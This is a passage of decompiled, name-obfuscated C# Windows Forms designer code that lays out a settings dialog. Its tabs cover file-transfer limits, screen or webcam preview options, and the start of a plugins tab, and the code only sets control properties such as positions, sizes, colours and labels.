        this.vmethod_24().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_26().BackColor = SystemColors.AppWorkspace;
        this.vmethod_26().Controls.Add(this.vmethod_180());
        this.vmethod_26().Controls.Add(this.vmethod_166());
        this.vmethod_26().Controls.Add(this.vmethod_168());
        this.vmethod_26().Controls.Add(this.vmethod_162());
        this.vmethod_26().Controls.Add(this.vmethod_154());
        this.vmethod_26().Controls.Add(this.vmethod_156());
        this.vmethod_26().Controls.Add(this.vmethod_158());
        this.vmethod_26().Controls.Add(this.vmethod_148());
        this.vmethod_26().Controls.Add(this.vmethod_150());
        this.vmethod_26().Controls.Add(this.vmethod_152());
        this.vmethod_26().Controls.Add(this.vmethod_140());
        this.vmethod_26().Controls.Add(this.vmethod_142());
        this.vmethod_26().Controls.Add(this.vmethod_50());
        this.vmethod_26().Controls.Add(this.vmethod_52());
        this.vmethod_26().Controls.Add(this.vmethod_54());
        this.vmethod_26().Controls.Add(this.vmethod_32());
        this.vmethod_26().Controls.Add(this.vmethod_28());
        this.vmethod_26().Controls.Add(this.vmethod_30());
        this.vmethod_26().Controls.Add(this.vmethod_164());
        this.vmethod_26().Controls.Add(this.vmethod_160());
        this.vmethod_26().Controls.Add(this.vmethod_48());
        this.vmethod_26().Controls.Add(this.vmethod_34());
        this.vmethod_26().Location = new Point(4, 0x16);
        this.vmethod_26().Margin = new Padding(2);
        this.vmethod_26().Name = "tbTransfers";
        this.vmethod_26().Padding = new Padding(2);
        this.vmethod_26().Size = new Size(0x23b, 0xe2);
        this.vmethod_26().TabIndex = 1;
        this.vmethod_26().Text = "Transfers";
        this.vmethod_180().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_180().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_180().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_180().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_180().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_180().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_180().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_180().Border.HoverVisible = true;
        this.vmethod_180().Border.Rounding = 6;
        this.vmethod_180().Border.Thickness = 1;
        this.vmethod_180().Border.Type = ShapeTypes.Rounded;
        this.vmethod_180().Border.Visible = true;
        this.vmethod_180().DialogResult = DialogResult.None;
        this.vmethod_180().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_180().Image = null;
        this.vmethod_180().Location = new Point(0x1f2, 0xcc);
        this.vmethod_180().MouseState = MouseStates.Normal;
        this.vmethod_180().Name = "btnTransfersSave";
        this.vmethod_180().Size = new Size(0x44, 0x13);
        this.vmethod_180().TabIndex = 0x53;
        this.vmethod_180().Text = "Save";
        this.vmethod_180().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_180().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_180().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_180().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_180().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_180().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_180().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_180().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_166().AutoSize = true;
        this.vmethod_166().Enabled = false;
        this.vmethod_166().Location = new Point(0xbb, 0xad);
        this.vmethod_166().Name = "rbReplaceFilesModified";
        this.vmethod_166().Size = new Size(0x58, 0x11);
        this.vmethod_166().TabIndex = 0x52;
        this.vmethod_166().Text = "Only modified";
        this.vmethod_166().UseVisualStyleBackColor = true;
        this.vmethod_168().AutoSize = true;
        this.vmethod_168().Checked = true;
        this.vmethod_168().Enabled = false;
        this.vmethod_168().Location = new Point(0x91, 0xad);
        this.vmethod_168().Name = "rbReplaceFilesAll";
        this.vmethod_168().Size = new Size(0x24, 0x11);
        this.vmethod_168().TabIndex = 0x51;
        this.vmethod_168().TabStop = true;
        this.vmethod_168().Text = "All";
        this.vmethod_168().UseVisualStyleBackColor = true;
        this.vmethod_162().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_162().AutoSize = true;
        this.vmethod_162().BackColor = Color.Transparent;
        this.vmethod_162().Checked = true;
        this.vmethod_162().CheckState = CheckState.Checked;
        this.vmethod_162().Location = new Point(0x10, 0xae);
        this.vmethod_162().Margin = new Padding(1);
        this.vmethod_162().Name = "chkReplaceExisting";
        this.vmethod_162().Size = new Size(0x7d, 0x11);
        this.vmethod_162().TabIndex = 0x4e;
        this.vmethod_162().TabStop = false;
        this.vmethod_162().Text = "Replace existing files";
        this.vmethod_162().UseVisualStyleBackColor = false;
        this.vmethod_154().AutoSize = true;
        this.vmethod_154().BackColor = Color.Transparent;
        this.vmethod_154().FlatStyle = FlatStyle.Flat;
        this.vmethod_154().Location = new Point(210, 0x89);
        this.vmethod_154().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_154().Name = "lblMaxBandwidthRateOutKB";
        this.vmethod_154().Size = new Size(0x65, 13);
        this.vmethod_154().TabIndex = 0x40;
        this.vmethod_154().Text = "KB/s (0 = Unlimited)";
        this.vmethod_154().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_156().Location = new Point(0x91, 0x87);
        this.vmethod_156().Margin = new Padding(1);
        this.vmethod_156().MaxLength = 6;
        this.vmethod_156().Name = "txtMaxBandwidthRateOut";
        this.vmethod_156().Size = new Size(0x40, 20);
        this.vmethod_156().TabIndex = 0x3f;
        this.vmethod_156().Text = "0";
        this.vmethod_158().BackColor = Color.Transparent;
        this.vmethod_158().FlatStyle = FlatStyle.Flat;
        this.vmethod_158().Location = new Point(0x2d, 0x89);
        this.vmethod_158().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_158().Name = "lblMaxBandwidthRateOut";
        this.vmethod_158().Size = new Size(0x63, 13);
        this.vmethod_158().TabIndex = 0x3e;
        this.vmethod_158().Text = "Max speed out:";
        this.vmethod_158().TextAlign = ContentAlignment.TopRight;
        this.vmethod_148().AutoSize = true;
        this.vmethod_148().BackColor = Color.Transparent;
        this.vmethod_148().FlatStyle = FlatStyle.Flat;
        this.vmethod_148().Location = new Point(210, 0x73);
        this.vmethod_148().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_148().Name = "lblMaxBandwidthRateInKB";
        this.vmethod_148().Size = new Size(0x65, 13);
        this.vmethod_148().TabIndex = 60;
        this.vmethod_148().Text = "KB/s (0 = Unlimited)";
        this.vmethod_148().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_150().Location = new Point(0x91, 0x71);
        this.vmethod_150().Margin = new Padding(1);
        this.vmethod_150().MaxLength = 6;
        this.vmethod_150().Name = "txtMaxBandwidthRateIn";
        this.vmethod_150().Size = new Size(0x40, 20);
        this.vmethod_150().TabIndex = 0x3b;
        this.vmethod_150().Text = "0";
        this.vmethod_152().BackColor = Color.Transparent;
        this.vmethod_152().FlatStyle = FlatStyle.Flat;
        this.vmethod_152().Location = new Point(0x2d, 0x73);
        this.vmethod_152().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_152().Name = "lblMaxBandwidthRateIn";
        this.vmethod_152().Size = new Size(0x63, 13);
        this.vmethod_152().TabIndex = 0x3a;
        this.vmethod_152().Text = "Max speed in:";
        this.vmethod_152().TextAlign = ContentAlignment.TopRight;
        this.vmethod_140().Location = new Point(0x91, 0x4b);
        this.vmethod_140().Margin = new Padding(1);
        this.vmethod_140().MaxLength = 6;
        this.vmethod_140().Name = "txtTransfersMaxConcurrent";
        this.vmethod_140().Size = new Size(0x40, 20);
        this.vmethod_140().TabIndex = 0x39;
        this.vmethod_140().Text = "5";
        this.vmethod_142().BackColor = Color.Transparent;
        this.vmethod_142().FlatStyle = FlatStyle.Flat;
        this.vmethod_142().Location = new Point(14, 0x4b);
        this.vmethod_142().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_142().Name = "lblTransfersConcurrent";
        this.vmethod_142().Size = new Size(0x84, 20);
        this.vmethod_142().TabIndex = 0x38;
        this.vmethod_142().Text = "Max cuncurrent transfers:";
        this.vmethod_142().TextAlign = ContentAlignment.TopRight;
        this.vmethod_50().AutoSize = true;
        this.vmethod_50().BackColor = Color.Transparent;
        this.vmethod_50().FlatStyle = FlatStyle.Flat;
        this.vmethod_50().Location = new Point(0xd3, 0x39);
        this.vmethod_50().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_50().Name = "Label5";
        this.vmethod_50().Size = new Size(0x20, 13);
        this.vmethod_50().TabIndex = 0x18;
        this.vmethod_50().Text = "bytes";
        this.vmethod_50().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_52().Location = new Point(0x91, 0x35);
        this.vmethod_52().Margin = new Padding(1);
        this.vmethod_52().MaxLength = 6;
        this.vmethod_52().Name = "txtTransfersSendBufSize";
        this.vmethod_52().Size = new Size(0x40, 20);
        this.vmethod_52().TabIndex = 0x17;
        this.vmethod_52().Text = "8192";
        this.vmethod_54().BackColor = Color.Transparent;
        this.vmethod_54().FlatStyle = FlatStyle.Flat;
        this.vmethod_54().Location = new Point(0x2d, 0x38);
        this.vmethod_54().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_54().Name = "lblTransfersSendBufSize";
        this.vmethod_54().Size = new Size(0x63, 13);
        this.vmethod_54().TabIndex = 0x16;
        this.vmethod_54().Text = "Send buffer size:";
        this.vmethod_54().TextAlign = ContentAlignment.TopRight;
        this.vmethod_32().AutoSize = true;
        this.vmethod_32().BackColor = Color.Transparent;
        this.vmethod_32().FlatStyle = FlatStyle.Flat;
        this.vmethod_32().Location = new Point(210, 0x20);
        this.vmethod_32().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_32().Name = "lblTransfersRecvBufSizeBytes";
        this.vmethod_32().Size = new Size(0x20, 13);
        this.vmethod_32().TabIndex = 20;
        this.vmethod_32().Text = "bytes";
        this.vmethod_32().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_28().Location = new Point(0x91, 0x1f);
        this.vmethod_28().Margin = new Padding(1);
        this.vmethod_28().MaxLength = 6;
        this.vmethod_28().Name = "txtTransfersRecvBufSize";
        this.vmethod_28().Size = new Size(0x40, 20);
        this.vmethod_28().TabIndex = 0x13;
        this.vmethod_28().Text = "8192";
        this.vmethod_30().AutoSize = true;
        this.vmethod_30().BackColor = Color.Transparent;
        this.vmethod_30().FlatStyle = FlatStyle.Flat;
        this.vmethod_30().Location = new Point(0x2d, 0x20);
        this.vmethod_30().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_30().Name = "lblTransfersRecvBufSize";
        this.vmethod_30().Size = new Size(0x65, 13);
        this.vmethod_30().TabIndex = 0x12;
        this.vmethod_30().Text = "Receive buffer size:";
        this.vmethod_30().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_164().Image = Class131.smethod_24();
        this.vmethod_164().Location = new Point(0x13a, 0x89);
        this.vmethod_164().Margin = new Padding(2);
        this.vmethod_164().Name = "pbMaxBandwidthRateOut";
        this.vmethod_164().Size = new Size(15, 15);
        this.vmethod_164().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_164().TabIndex = 80;
        this.vmethod_164().TabStop = false;
        this.vmethod_160().Image = Class131.smethod_24();
        this.vmethod_160().Location = new Point(0x13a, 0x73);
        this.vmethod_160().Margin = new Padding(2);
        this.vmethod_160().Name = "pbMaxBandwidthRateIn";
        this.vmethod_160().Size = new Size(15, 15);
        this.vmethod_160().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_160().TabIndex = 0x4f;
        this.vmethod_160().TabStop = false;
        this.vmethod_48().Image = Class131.smethod_24();
        this.vmethod_48().Location = new Point(0xf5, 0x39);
        this.vmethod_48().Margin = new Padding(2);
        this.vmethod_48().Name = "pbTransfersSendBufSize";
        this.vmethod_48().Size = new Size(15, 15);
        this.vmethod_48().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_48().TabIndex = 0x19;
        this.vmethod_48().TabStop = false;
        this.vmethod_34().Image = Class131.smethod_24();
        this.vmethod_34().Location = new Point(0xf5, 0x20);
        this.vmethod_34().Margin = new Padding(2);
        this.vmethod_34().Name = "pbTransfersRecvBufSize";
        this.vmethod_34().Size = new Size(15, 15);
        this.vmethod_34().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_34().TabIndex = 0x15;
        this.vmethod_34().TabStop = false;
        this.vmethod_56().BackColor = SystemColors.AppWorkspace;
        this.vmethod_56().Controls.Add(this.vmethod_182());
        this.vmethod_56().Controls.Add(this.vmethod_110());
        this.vmethod_56().Controls.Add(this.vmethod_76());
        this.vmethod_56().Controls.Add(this.vmethod_104());
        this.vmethod_56().Controls.Add(this.vmethod_106());
        this.vmethod_56().Controls.Add(this.vmethod_108());
        this.vmethod_56().Controls.Add(this.vmethod_102());
        this.vmethod_56().Controls.Add(this.vmethod_94());
        this.vmethod_56().Controls.Add(this.vmethod_96());
        this.vmethod_56().Controls.Add(this.vmethod_98());
        this.vmethod_56().Controls.Add(this.vmethod_100());
        this.vmethod_56().Controls.Add(this.vmethod_84());
        this.vmethod_56().Controls.Add(this.vmethod_86());
        this.vmethod_56().Controls.Add(this.vmethod_88());
        this.vmethod_56().Controls.Add(this.vmethod_90());
        this.vmethod_56().Controls.Add(this.vmethod_92());
        this.vmethod_56().Controls.Add(this.vmethod_74());
        this.vmethod_56().Controls.Add(this.vmethod_78());
        this.vmethod_56().Controls.Add(this.vmethod_80());
        this.vmethod_56().Controls.Add(this.vmethod_82());
        this.vmethod_56().Controls.Add(this.vmethod_72());
        this.vmethod_56().Controls.Add(this.vmethod_68());
        this.vmethod_56().Controls.Add(this.vmethod_70());
        this.vmethod_56().Controls.Add(this.vmethod_62());
        this.vmethod_56().Controls.Add(this.vmethod_64());
        this.vmethod_56().Controls.Add(this.vmethod_66());
        this.vmethod_56().Controls.Add(this.vmethod_60());
        this.vmethod_56().Controls.Add(this.vmethod_58());
        this.vmethod_56().Location = new Point(4, 0x16);
        this.vmethod_56().Margin = new Padding(2);
        this.vmethod_56().Name = "tbPreview";
        this.vmethod_56().Padding = new Padding(2);
        this.vmethod_56().Size = new Size(0x23b, 0xe2);
        this.vmethod_56().TabIndex = 3;
        this.vmethod_56().Text = "Preview";
        this.vmethod_182().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_182().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_182().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_182().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_182().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_182().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_182().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_182().Border.HoverVisible = true;
        this.vmethod_182().Border.Rounding = 6;
        this.vmethod_182().Border.Thickness = 1;
        this.vmethod_182().Border.Type = ShapeTypes.Rounded;
        this.vmethod_182().Border.Visible = true;
        this.vmethod_182().DialogResult = DialogResult.None;
        this.vmethod_182().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_182().Image = null;
        this.vmethod_182().Location = new Point(0x1f2, 0xcc);
        this.vmethod_182().MouseState = MouseStates.Normal;
        this.vmethod_182().Name = "btPreviewSave";
        this.vmethod_182().Size = new Size(0x44, 0x13);
        this.vmethod_182().TabIndex = 0x54;
        this.vmethod_182().Text = "Save";
        this.vmethod_182().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_182().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_182().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_182().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_182().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_182().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_182().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_182().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_110().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_110().AutoSize = true;
        this.vmethod_110().BackColor = Color.Transparent;
        this.vmethod_110().Checked = true;
        this.vmethod_110().CheckState = CheckState.Checked;
        this.vmethod_110().Location = new Point(0x25, 0xcd);
        this.vmethod_110().Margin = new Padding(1);
        this.vmethod_110().Name = "chkPreviewTransparentFrames";
        this.vmethod_110().Size = new Size(0x75, 0x11);
        this.vmethod_110().TabIndex = 0x51;
        this.vmethod_110().TabStop = false;
        this.vmethod_110().Text = "Transparent frames";
        this.vmethod_110().UseVisualStyleBackColor = false;
        this.vmethod_76().Location = new Point(0xbd, 0x9f);
        this.vmethod_76().Margin = new Padding(1);
        this.vmethod_76().MaxLength = 6;
        this.vmethod_76().Name = "txtPreviewDoubleClickpxY";
        this.vmethod_76().Size = new Size(0x2b, 20);
        this.vmethod_76().TabIndex = 0x44;
        this.vmethod_76().Text = "475";
        this.vmethod_104().AutoSize = false;
        this.vmethod_104().Location = new Point(0x81, 0x67);
        this.vmethod_104().Margin = new Padding(2);
        this.vmethod_104().Maximum = 100;
        this.vmethod_104().Minimum = 10;
        this.vmethod_104().Name = "tbPreviewQuality";
        this.vmethod_104().Size = new Size(0xcf, 0x11);
        this.vmethod_104().TabIndex = 80;
        this.vmethod_104().TickStyle = TickStyle.None;
        this.vmethod_104().Value = 30;
        this.vmethod_106().AutoSize = true;
        this.vmethod_106().BackColor = Color.Transparent;
        this.vmethod_106().ForeColor = Color.Black;
        this.vmethod_106().Location = new Point(0x14e, 0x67);
        this.vmethod_106().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_106().Name = "lblPreviewScreenQualityValue";
        this.vmethod_106().Size = new Size(0x1b, 13);
        this.vmethod_106().TabIndex = 0x4f;
        this.vmethod_106().Text = "30%";
        this.vmethod_108().AutoSize = true;
        this.vmethod_108().BackColor = Color.Transparent;
        this.vmethod_108().ForeColor = Color.Black;
        this.vmethod_108().Location = new Point(0x5b, 0x67);
        this.vmethod_108().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_108().Name = "lblPreviewScreenQuality";
        this.vmethod_108().Size = new Size(0x2a, 13);
        this.vmethod_108().TabIndex = 0x4e;
        this.vmethod_108().Text = "Quality:";
        this.vmethod_102().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_102().AutoSize = true;
        this.vmethod_102().BackColor = Color.Transparent;
        this.vmethod_102().Checked = true;
        this.vmethod_102().CheckState = CheckState.Checked;
        this.vmethod_102().Location = new Point(0x25, 0xba);
        this.vmethod_102().Margin = new Padding(1);
        this.vmethod_102().Name = "chkPreviewDisplayFrameData";
        this.vmethod_102().Size = new Size(0x71, 0x11);
        this.vmethod_102().TabIndex = 0x4d;
        this.vmethod_102().TabStop = false;
        this.vmethod_102().Text = "Display frame data";
        this.vmethod_102().UseVisualStyleBackColor = false;
        this.vmethod_94().BackColor = Color.White;
        this.vmethod_94().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_94().ForeColor = Color.Black;
        this.vmethod_94().FormattingEnabled = true;
        this.vmethod_94().Location = new Point(0x131, 0x9f);
        this.vmethod_94().Margin = new Padding(2);
        this.vmethod_94().Name = "cbPreviewDoubleClickSize";
        this.vmethod_94().Size = new Size(0x39, 0x15);
        this.vmethod_94().TabIndex = 0x4c;
        this.vmethod_94().TabStop = false;
        this.vmethod_96().AutoSize = true;
        this.vmethod_96().BackColor = Color.Transparent;
        this.vmethod_96().ForeColor = Color.Black;
        this.vmethod_96().Location = new Point(0x110, 0xa1);
        this.vmethod_96().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_96().Name = "Label6";
        this.vmethod_96().Size = new Size(30, 13);
        this.vmethod_96().TabIndex = 0x4b;
        this.vmethod_96().Text = "Size:";
        this.vmethod_98().BackColor = Color.White;
        this.vmethod_98().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_98().ForeColor = Color.Black;
        this.vmethod_98().FormattingEnabled = true;
        this.vmethod_98().Location = new Point(0x131, 130);
        this.vmethod_98().Margin = new Padding(2);
        this.vmethod_98().Name = "cbPreviewDefaultSize";
        this.vmethod_98().Size = new Size(0x39, 0x15);
        this.vmethod_98().TabIndex = 20;
        this.vmethod_98().TabStop = false;
        this.vmethod_100().AutoSize = true;
        this.vmethod_100().BackColor = Color.Transparent;
        this.vmethod_100().ForeColor = Color.Black;
        this.vmethod_100().Location = new Point(0x110, 0x84);
        this.vmethod_100().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_100().Name = "lblScreenSize";
        this.vmethod_100().Size = new Size(30, 13);
        this.vmethod_100().TabIndex = 0x13;
        this.vmethod_100().Text = "Size:";
        this.vmethod_84().AutoSize = true;
        this.vmethod_84().BackColor = Color.Transparent;
        this.vmethod_84().FlatStyle = FlatStyle.Flat;
        this.vmethod_84().Location = new Point(0xe9, 0x84);
        this.vmethod_84().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_84().Name = "lblPreviewDefaultSizePixels";
        this.vmethod_84().Size = new Size(0x21, 13);
        this.vmethod_84().TabIndex = 0x4a;
        this.vmethod_84().Text = "pixels";
        this.vmethod_84().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_86().Location = new Point(0xbd, 130);
        this.vmethod_86().Margin = new Padding(1);
        this.vmethod_86().MaxLength = 6;
        this.vmethod_86().Name = "txtPreviewDefaultpxY";
        this.vmethod_86().Size = new Size(0x2b, 20);
        this.vmethod_86().TabIndex = 0x49;
        this.vmethod_86().Text = "237";
        this.vmethod_88().AutoSize = true;
        this.vmethod_88().Location = new Point(0x43, 0x84);
        this.vmethod_88().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_88().Name = "lblPreviewDefaultSize";
        this.vmethod_88().Size = new Size(0x41, 13);
        this.vmethod_88().TabIndex = 0x48;
        this.vmethod_88().Text = "Default size:";
        this.vmethod_88().TextAlign = ContentAlignment.TopRight;
        this.vmethod_90().AutoSize = true;
        this.vmethod_90().BackColor = Color.Transparent;
        this.vmethod_90().FlatStyle = FlatStyle.Flat;
        this.vmethod_90().Location = new Point(0xb1, 0x84);
        this.vmethod_90().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_90().Name = "lblPreviewDefaultSizex";
        this.vmethod_90().Size = new Size(12, 13);
        this.vmethod_90().TabIndex = 0x47;
        this.vmethod_90().Text = "x";
        this.vmethod_90().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_92().Location = new Point(0x87, 130);
        this.vmethod_92().Margin = new Padding(1);
        this.vmethod_92().MaxLength = 6;
        this.vmethod_92().Name = "txtPreviewDefaultpxX";
        this.vmethod_92().Size = new Size(0x2b, 20);
        this.vmethod_92().TabIndex = 70;
        this.vmethod_92().Text = "380";
        this.vmethod_74().AutoSize = true;
        this.vmethod_74().BackColor = Color.Transparent;
        this.vmethod_74().FlatStyle = FlatStyle.Flat;
        this.vmethod_74().Location = new Point(0xe9, 0xa1);
        this.vmethod_74().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_74().Name = "lblPreviewDoubleClickPixels";
        this.vmethod_74().Size = new Size(0x21, 13);
        this.vmethod_74().TabIndex = 0x45;
        this.vmethod_74().Text = "pixels";
        this.vmethod_74().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_78().AutoSize = true;
        this.vmethod_78().Location = new Point(0x2d, 0xa1);
        this.vmethod_78().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_78().Name = "lblPreviewDoubleClickSize";
        this.vmethod_78().Size = new Size(90, 13);
        this.vmethod_78().TabIndex = 0x43;
        this.vmethod_78().Text = "Double click size:";
        this.vmethod_78().TextAlign = ContentAlignment.TopRight;
        this.vmethod_80().AutoSize = true;
        this.vmethod_80().BackColor = Color.Transparent;
        this.vmethod_80().FlatStyle = FlatStyle.Flat;
        this.vmethod_80().Location = new Point(0xb1, 0xa1);
        this.vmethod_80().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_80().Name = "lblPreviewDoubleClickSizex";
        this.vmethod_80().Size = new Size(12, 13);
        this.vmethod_80().TabIndex = 0x42;
        this.vmethod_80().Text = "x";
        this.vmethod_80().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_82().Location = new Point(0x87, 0x9f);
        this.vmethod_82().Margin = new Padding(1);
        this.vmethod_82().MaxLength = 6;
        this.vmethod_82().Name = "txtPreviewDoubleClickpxX";
        this.vmethod_82().Size = new Size(0x2b, 20);
        this.vmethod_82().TabIndex = 0x41;
        this.vmethod_82().Text = "760";
        this.vmethod_72().AutoSize = false;
        this.vmethod_72().LargeChange = 100;
        this.vmethod_72().Location = new Point(0x83, 0x4e);
        this.vmethod_72().Margin = new Padding(2);
        this.vmethod_72().Maximum = 0xea60;
        this.vmethod_72().Minimum = 1;
        this.vmethod_72().Name = "tbPreviewInterval";
        this.vmethod_72().Size = new Size(0xcd, 0x11);
        this.vmethod_72().TabIndex = 0x40;
        this.vmethod_72().TickStyle = TickStyle.None;
        this.vmethod_72().Value = 1;
        this.vmethod_68().AutoSize = true;
        this.vmethod_68().Location = new Point(0x14e, 0x4f);
        this.vmethod_68().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_68().Name = "lblPreviewScreenDelayms";
        this.vmethod_68().Size = new Size(0x1d, 13);
        this.vmethod_68().TabIndex = 0x3f;
        this.vmethod_68().Text = "1 ms";
        this.vmethod_70().AutoSize = true;
        this.vmethod_70().Location = new Point(0x34, 0x4f);
        this.vmethod_70().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_70().Name = "lblPreviewScreenInterval";
        this.vmethod_70().Size = new Size(0x52, 13);
        this.vmethod_70().TabIndex = 0x3d;
        this.vmethod_70().Text = "Update interval:";
        this.vmethod_70().TextAlign = ContentAlignment.TopRight;
        this.vmethod_62().AutoSize = true;
        this.vmethod_62().Location = new Point(0xc5, 0x34);
        this.vmethod_62().Margin = new Padding(2);
        this.vmethod_62().Name = "rbPreviewWebcam";
        this.vmethod_62().Size = new Size(0x44, 0x11);
        this.vmethod_62().TabIndex = 60;
        this.vmethod_62().Text = "Webcam";
        this.vmethod_62().UseVisualStyleBackColor = true;
        this.vmethod_64().AutoSize = true;
        this.vmethod_64().Location = new Point(0x59, 0x34);
        this.vmethod_64().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_64().Name = "lblPreviewSource";
        this.vmethod_64().Size = new Size(0x2c, 13);
        this.vmethod_64().TabIndex = 0x3b;
        this.vmethod_64().Text = "Source:";
        this.vmethod_64().TextAlign = ContentAlignment.TopRight;
        this.vmethod_66().AutoSize = true;
        this.vmethod_66().Checked = true;
        this.vmethod_66().Location = new Point(0x88, 0x34);
        this.vmethod_66().Margin = new Padding(2);
        this.vmethod_66().Name = "rbPreviewScreen";
        this.vmethod_66().Size = new Size(0x3b, 0x11);
        this.vmethod_66().TabIndex = 0x3a;
        this.vmethod_66().TabStop = true;
        this.vmethod_66().Text = "Screen";
        this.vmethod_66().UseVisualStyleBackColor = true;
        this.vmethod_60().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_60().AutoSize = true;
        this.vmethod_60().BackColor = Color.Transparent;
        this.vmethod_60().Checked = true;
        this.vmethod_60().CheckState = CheckState.Checked;
        this.vmethod_60().Location = new Point(12, 11);
        this.vmethod_60().Margin = new Padding(1);
        this.vmethod_60().Name = "chkPreviewEnable";
        this.vmethod_60().RightToLeft = RightToLeft.Yes;
        this.vmethod_60().Size = new Size(0x68, 0x11);
        this.vmethod_60().TabIndex = 0x38;
        this.vmethod_60().TabStop = false;
        this.vmethod_60().Text = "Enable previews";
        this.vmethod_60().UseVisualStyleBackColor = false;
        this.vmethod_58().Image = Class131.smethod_24();
        this.vmethod_58().Location = new Point(120, 11);
        this.vmethod_58().Margin = new Padding(2);
        this.vmethod_58().Name = "pbPreviewInfo";
        this.vmethod_58().Size = new Size(15, 15);
        this.vmethod_58().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_58().TabIndex = 0x39;
        this.vmethod_58().TabStop = false;
        this.vmethod_36().BackColor = SystemColors.AppWorkspace;
        this.vmethod_36().Controls.Add(this.vmethod_262());
        this.vmethod_36().Controls.Add(this.vmethod_184());
        this.vmethod_36().Controls.Add(this.vmethod_130());
        this.vmethod_36().Controls.Add(this.vmethod_132());
        this.vmethod_36().Controls.Add(this.vmethod_126());
        this.vmethod_36().Controls.Add(this.vmethod_128());
        this.vmethod_36().Controls.Add(this.vmethod_114());
        this.vmethod_36().Controls.Add(this.vmethod_44());
        this.vmethod_36().Controls.Add(this.vmethod_46());
        this.vmethod_36().Controls.Add(this.vmethod_42());
        this.vmethod_36().Controls.Add(this.vmethod_38());
        this.vmethod_36().Controls.Add(this.vmethod_40());
        this.vmethod_36().Controls.Add(this.vmethod_112());
        this.vmethod_36().Location = new Point(4, 0x16);
        this.vmethod_36().Margin = new Padding(2);
        this.vmethod_36().Name = "tbPlugins";
        this.vmethod_36().Padding = new Padding(2);
        this.vmethod_36().Size = new Size(0x23b, 0xe2);
        this.vmethod_36().TabIndex = 2;
        this.vmethod_36().Text = "Plugins";
        this.vmethod_262().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_262().AutoSize = true;
        this.vmethod_262().BackColor = Color.Transparent;
        this.vmethod_262().Location = new Point(420, 0x6d);
